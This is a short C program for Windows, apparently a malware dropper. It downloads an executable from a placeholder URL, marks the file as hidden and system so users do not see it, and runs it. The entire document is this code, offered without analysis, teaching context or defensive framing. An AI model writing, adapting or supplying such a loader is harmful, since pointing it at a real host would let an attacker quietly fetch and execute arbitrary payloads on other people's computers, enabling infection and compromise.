#include <windows.h>
#include <stdio.h>

#define URL "https://localhost/tmp"
#define FILE_NAME "tmp.exe"

int create_process(char *cmd) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (CreateProcess(0, cmd, 0, 0, 0, 0, 0, 0, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        return 1;
    }

    return 0;
}

void main() {
    URLDownloadToFile(0, URL, FILE_NAME, 0, 0);
    SetFileAttributes(FILE_NAME, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
    create_process(FILE_NAME);
}
